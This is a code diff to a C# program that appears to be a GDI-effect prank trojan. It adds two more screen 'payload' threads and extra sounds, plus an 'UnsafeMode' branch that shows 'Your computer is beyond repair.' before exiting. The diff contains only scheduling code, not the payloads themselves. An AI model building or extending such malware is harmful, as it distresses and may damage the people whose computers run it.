@@ -14,7 +14,7 @@ namespace MALFUNCTIONING
 {
     internal class execute
     {
-        public static int payloadsCount = 11;    // 这里修改GDI数量
+        public static int payloadsCount = 13;    // 这里修改GDI数量
         public static List<int> remainPayloads = new List<int>();
         public static int Sound = 0;
         public static void Run()
@@ -30,6 +30,12 @@ namespace MALFUNCTIONING
             for (int _ = 0; _ < payloadsCount; _++)
             {
                 Next();
+            }
+            payload = payloadsCount;// 停止
+            if (UnsafeMode)
+            {
+                MessageBoxTimeout(IntPtr.Zero, "Your computer is beyond repair.", "It's no use begging me", 0x40/*MB_ICONINFORMATION*/, 0, 5000);
+                Environment.Exit(0);
             }
         }
         public static void Next()
@@ -78,6 +84,12 @@ namespace MALFUNCTIONING
                 case 10:
                     NewThread(GDI11);
                     break;
+                case 11:
+                    NewThread(GDI12);
+                    break;
+                case 12:
+                    NewThread(GDI13);
+                    break;
             }
         }
         public static void Check_Sound(int index)
@@ -116,6 +128,15 @@ namespace MALFUNCTIONING
                     break;
                 case 10:
                     Sound11();
+                    break;
+                case 11:
+                    Sound12();
+                    break;
+                case 12:
+                    Sound13();
+                    break;
+                case 13:
+                    Sound14();
                     break;
             }
         }
